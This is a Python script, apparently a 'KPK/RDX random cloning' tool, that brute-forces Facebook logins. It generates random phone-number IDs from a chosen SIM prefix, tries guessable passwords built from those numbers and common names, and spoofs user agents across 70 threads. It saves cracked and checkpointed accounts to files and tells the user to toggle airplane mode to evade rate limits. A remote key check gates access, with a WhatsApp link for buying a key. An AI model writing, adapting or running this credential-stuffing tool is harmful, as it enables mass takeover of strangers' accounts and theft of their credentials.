#coding=utf
import os
try:
    import requests
except ImportError:
    print('\n [•] INSTALLING REQUESTS MODULE\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [•] INSTALLING FUTURES MODULE\n')
    os.system('pip install mechanize')

try:
    import bs4
except ImportError:
    print('\n [•] INSTALLING BS4 MODULE\n')
    os.system('pip install bs4')
    
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2=[]
ugen=[]

for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
def uaku2():
	try:
		ua=open('USER-AGENTS.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/REHAN-XD/RDX/blob/main/USER-AGENTS.txt').text
		ua=open('.USER-AGENTS.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.USER-AGENTS.txt','r').read().splitlines()


logo = """
.%%...%%...%%%%...%%%%%...%%...%%...%%%%...%%..%%.
.%%%.%%%..%%..%%..%%..%%..%%...%%..%%..%%..%%%.%%.
.%%.%.%%..%%%%%%..%%%%%...%%.%.%%..%%%%%%..%%.%%%.
.%%...%%..%%..%%..%%..%%..%%%%%%%..%%..%%..%%..%%.
.%%...%%..%%..%%..%%..%%...%%.%%...%%..%%..%%..%%.
--------------------------------------------------
[•] AUTHOR     : \033[1;32mMARWAN\033[1;37m
[•] GITHUB     : \033[1;32mYkimg\033[1;37m
[•] TOOL NAME  : \033[1;32mKPK\033[1;37m
[•] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
[•] STATUS     : \033[1;32mFREE\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.0 \033[1;37m"SCRIPT BY: RDX"\033[1;37m
--------------------------------------------------"""

loop = 0
oks = []
cps = []

print('[•] CHECKING MODULE!')
time.sleep(1)

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def rehan():
	os.system('clear')
	print(logo)
	print('[1] RANDOM PAK CLONING')
	print('[2] CONTACT WITH OWNER')
	print('[0] EXIT')
	print(50*"-")
	gh = input('[•] CHOOSE : ')
	if gh =='1':
		menu()
	elif gh =='2':
		os.system('xdg-open https://www.facebook.com/MARWAN.TECH1')
	elif gh =='0':
		print('[•] THANKS FOR USE ')
		time.sleep(3)
		exit()
	else:
		print('[•] CHOOSE CORRECT OPTION')
		time.sleep(2)
		rehan()

def menu():
    os.system('clear')
    print(logo)
    print('[1] LAST 7 DIGIT')
    print('[2] ALI + KHAN PASS')
    print('[3] MALIK + BALOCH PASS')
    print('[4] BEST FOR PUBG IDS')
    print('[5] BEST FOR FREE FIRE IDS')
    print('[0] EXIT TO MAIN MENU')
    print(50*"-")
    op = input('[•] CHOOSE : ')
    if op =='1':
        svn_digit()
    elif op =='2':
        ali_khan()
    elif op =='3':
        malik_baloch()
    elif op =='4':
        pubg()
    elif op =='5':
        ff()
    elif op =='0':
        rehan()
    else:
        print('\n\033[1;37m[•] Choose valid option\033[0;97m')
        time.sleep(2)
        menu()

#____

def svn_digit():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	print(50*"-")
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	print(50*"-")
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(fcrack,uid,pwx,tl)
	print('[•] PROCCES COMPLETED')
	print('[•] SAVED IN RDX-OK.txt ')
	input('[•] PRESS ENTER FOR BACK')
	rehan()

#____

def ali_khan():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	print(50*"-")
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	print(50*"-")
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru,'khankhan','khan1122','khan12','khan123','khan786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[•] PROCCES COMPLETED')
	print('[•] SAVED IN RDX-OK.txt ')
	input('[•] PRESS ENTER FOR BACK')
	rehan()

#____________





#_______

def malik_baloch():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	print(50*"-")
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	print(50*"-")
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru,'malik123','malik1122','baloch786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[•] PROCCES COMPLETED')
	print('[•] SAVED IN RDX-OK.txt ')
	input('[•] PRESS ENTER FOR BACK')
	rehan()

#____

def pubg():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	print(50*"-")
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	print(50*"-")
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru,'pubgqueen','pubgking','pubglover']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[•] PROCCES COMPLETED')
	print('[•] SAVED IN RDX-OK.txt ')
	input('[•] PRESS ENTER FOR BACK')
	rehan()
#____

def ff():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	print(50*"-")
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	print(50*"-")
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru,'freefire','fflover','ffking','ffqueen']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[•] PROCCES COMPLETED')
	print('[•] SAVED IN RDX-OK.txt ')
	input('[•] PRESS ENTER FOR BACK')
	rehan()

#_____
def fcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global ugen  
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=g0zoY3duniexZneIEwG7Gmhw; sb=g0zoY7Mj9v-Ztrq0PfLCyD8G',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[KPK-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('KPK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[KPK-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('KPK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRDX\033[1;97m] %s| \33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)

  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/GHONDA302/YKING/main/Aproval.txt').text
    if id in httpCaht:
      print("\33[1;32m[•] YOUR KEY IS APPROVED.")
      msg = str(os.geteuid())
      time.sleep(0.5)
      rehan()
      pass
    else:
      print("[•] YOUR KEY : "+id)
      print('[•] \33[1;37m----------------------------------------------')
      print("[•] \33[1;32mNOTE:")
      print("[•] \33[1;37m----------------------------------------------")
      print("[•] \33[1;37mTOOL IS FREE BUT YOU HAVE TO\nGET APPROVAL FIRST.")
      print('[•] \33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923151112743?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()

approval()
